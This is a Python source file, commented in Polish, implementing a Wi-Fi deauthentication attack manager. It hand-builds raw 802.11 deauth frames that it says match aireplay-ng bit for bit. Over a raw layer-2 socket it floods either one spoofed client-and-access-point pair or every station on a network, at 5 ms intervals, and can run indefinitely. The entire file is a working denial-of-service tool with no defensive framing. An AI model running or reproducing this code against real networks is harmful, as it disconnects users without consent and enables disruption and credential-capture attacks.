#!/usr/bin/env python3

from typing import Dict, Tuple
import threading
import time
import struct
import binascii
from scapy.all import conf

class DeauthAttackManager:
    """
    Manager ataków deauth – wersja BINARY EXACT.
    Wysyła ramki identyczne bit w bit z tymi z aireplay-ng.
    Logic Update: Rozróżnia atak celowany (unicast) od masowego (broadcast).
    """

    def __init__(self, debug: bool = False):
        self.debug = debug
        self._attacks: Dict[Tuple[str, str, str], Dict] = {}
        self._lock = threading.Lock()
        
        # --- WZORZEC PCAP (Aireplay-ng style) ---
        # Radiotap Header (12 bajtów)
        self.RADIOTAP = b'\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00'
        
        # Frame Control (Deauth) + Duration
        self.FRAME_CTRL_DUR = b'\xc0\x00\x3a\x01'
        
        # Reason Code 7 (Class 3 frame received from nonassociated STA)
        self.REASON_CODE = b'\x07\x00'
        
        self.SEQ_NUM = b'\x00\x00'

    def log(self, msg: str):
        if self.debug:
            ts = time.strftime("%H:%M:%S")
            print(f"[DEAUTH {ts}] {msg}")

    def _mac_to_bytes(self, mac_str: str) -> bytes:
        """Konwertuje MAC 'aa:bb:cc...' na surowe bajty."""
        return binascii.unhexlify(mac_str.replace(':', '').replace('-', ''))

    def start_client_attack(
        self,
        client_mac: str,
        ap_mac: str,
        interface: str,
        attack_duration: int = 0, # 0 = nieskończoność
    ) -> bool:
        """
        Uruchamia osobny wątek dla ataku.
        """
        key = (client_mac, ap_mac, interface)

        with self._lock:
            if key in self._attacks:
                return False # Już atakujemy tego klienta

            stop_event = threading.Event()
            t = threading.Thread(
                target=self._attack_worker,
                args=(client_mac, ap_mac, interface, attack_duration, stop_event),
                daemon=True,
            )
            self._attacks[key] = {"thread": t, "stop": stop_event}
            t.start()

        self.log(f"Started BINARY deauth: {client_mac} -> {ap_mac}")
        return True

    def _build_frame(self, addr1: bytes, addr2: bytes, addr3: bytes, seq: int) -> bytes:
        # Sequence control packaging
        seq_bytes = struct.pack('<H', (seq << 4))
        
        return (
            self.RADIOTAP + 
            self.FRAME_CTRL_DUR + 
            addr1 + # Destination
            addr2 + # Source
            addr3 + # BSSID
            seq_bytes + 
            self.REASON_CODE
        )

    def _attack_worker(
        self,
        client_mac: str,
        ap_mac: str,
        interface: str,
        attack_duration: int,
        stop_event: threading.Event,
    ):
        # Pre-calculate bytes
        c_bytes = self._mac_to_bytes(client_mac) # Target Client
        a_bytes = self._mac_to_bytes(ap_mac)     # AP BSSID
        b_bytes = self._mac_to_bytes("ff:ff:ff:ff:ff:ff") # Broadcast
        
        is_broadcast_attack = (client_mac.lower() == "ff:ff:ff:ff:ff:ff")

        # RAW Socket L2
        try:
            s = conf.L2socket(iface=interface)
        except Exception as e:
            self.log(f"CRITICAL: Socket error on {interface}: {e}")
            return

        end_time = time.time() + attack_duration if attack_duration > 0 else 9999999999
        seq_counter = 0

        try:
            while not stop_event.is_set() and time.time() < end_time:
                
                if is_broadcast_attack:
                    # SCENARIO: KICK EVERYONE (Broadcast)
                    # Addr1=FF:FF (Dest), Addr2=AP (Src), Addr3=AP (BSSID)
                    pkt_b = self._build_frame(b_bytes, a_bytes, a_bytes, seq_counter)
                    try:
                        s.send(pkt_b)
                        s.send(pkt_b) # Double tap for reliability
                        seq_counter = (seq_counter + 2) % 4096
                    except OSError:
                        pass
                
                else:
                    # SCENARIO: SNIPER (Specific Client Only)
                    # 1. AP -> Client (You are kicked!)
                    pkt1 = self._build_frame(c_bytes, a_bytes, a_bytes, seq_counter)
                    
                    # 2. Client -> AP (I am leaving!) - spoofing client
                    pkt2 = self._build_frame(a_bytes, c_bytes, a_bytes, seq_counter + 1)
                    
                    try:
                        s.send(pkt1)
                        s.send(pkt2)
                        # NO broadcast packet sent here!
                        seq_counter = (seq_counter + 2) % 4096
                    except OSError:
                        pass

                # Aggressive speed matching aireplay-ng
                time.sleep(0.005) 

        except Exception as e:
            self.log(f"Error in attack loop: {e}")
        finally:
            s.close()
            
            # Auto-cleanup logic
            key = (client_mac, ap_mac, interface)
            with self._lock:
                if key in self._attacks:
                    del self._attacks[key]

    def stop_client_attack(self, client_mac: str, ap_mac: str, interface: str):
        key = (client_mac, ap_mac, interface)
        with self._lock:
            info = self._attacks.get(key)
            if info:
                info["stop"].set()

    def stop_all_attacks(self):
        with self._lock:
            keys = list(self._attacks.keys())
            for key in keys:
                self._attacks[key]["stop"].set()
